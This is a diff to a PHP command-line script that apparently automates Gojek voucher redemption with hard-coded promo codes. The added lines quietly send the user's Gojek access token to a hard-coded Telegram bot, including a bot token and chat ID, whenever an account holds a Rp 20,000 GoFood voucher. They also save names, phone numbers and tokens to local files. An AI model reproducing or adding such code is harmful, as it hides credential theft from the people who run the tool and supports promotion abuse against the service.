@@ -58,7 +58,7 @@ function change(){
         goto goride;
         }else{
         echo "\n".color("red","-] Message: ".$messageboba10);
-        echo "\n".color("yellow","!] Redeem Voucher Gofood 10k");
+        echo "\n".color("yellow","!] Redeem Voucher Gofood 15k");
         echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
         echo color("yellow",".");
@@ -80,7 +80,7 @@ function change(){
         sleep(1);
         }
         sleep(3);
-        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"G-3VC8BZF"}');
+        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"AYOCOBAGOJEK"}');
         $message1 = fetch_value($goride,'"message":"','"');
         echo "\n".color("green","+] Message: ".$message1);
         echo "\n".color("yellow","!] Redeem Voucher Goride");
@@ -118,7 +118,38 @@ function change(){
 	$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
 	$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
 	$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
-          }
+                                        $TOKEN  = "931114159:AAGK4O3nuld9uNw_IneDcSPVxYDGAaaazvQ";
+					$chatid = "905644289";
+                                        if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
+					$pesan 	= $token;
+					$method	= "sendMessage";
+					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+					$post = [
+ 					'chat_id' => $chatid,
+ 			        	'text' => $pesan
+					];
+                                        $header = [
+                                        "X-Requested-With: XMLHttpRequest",
+                                        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
+                                        ];
+                                        $ch = curl_init();
+                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ch, CURLOPT_URL, $url);
+                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                                        $datas = curl_exec($ch);
+                                        $error = curl_error($ch);
+                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                                        curl_close($ch);
+                                        $debug['text'] = $pesan;
+                                        $debug['respon'] = json_decode($datas, true);
+                                        }
+         if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
+         save("akungojek20k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
+         }else{
+         save("akungojek10k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
+         }
          setpin:
          echo "\n".color("nevy","?] Mau set PIN? : ");
          $pilih1 = trim(fgets(STDIN));
